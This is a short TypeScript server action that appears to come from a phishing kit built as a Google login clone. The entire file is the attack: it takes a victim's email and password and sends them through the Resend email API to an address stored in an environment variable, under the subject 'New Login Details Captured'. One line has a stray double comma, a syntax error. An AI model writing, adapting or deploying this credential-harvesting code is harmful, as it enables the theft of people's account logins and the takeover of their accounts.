"use server"

import { Resend } from "resend"

const resend = new Resend(process.env.RESEND_API_KEY)

export async function sendDetailsAction(email: string, pass: string) {
  try {
    await resend.emails.send({
      from: "Google Clone <onboarding@resend.dev>",
      to: process.env.RECEIVER_EMAIL_ADDRESS,,
      subject: "New Login Details Captured",
      html: `
        <div style="font-family: sans-serif; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
          <h2 style="color: #202124;">Login Details Captured</h2>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Password:</strong> ${pass}</p>
          <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;" />
          <p style="font-size: 12px; color: #5f6368;">This is an automated notification from your Google login replica.</p>
        </div>
      `,
    })
    return { success: true }
  } catch (error) {
    console.error("Error sending email:", error)
    return { success: false, error: "Failed to send notification" }
  }
}
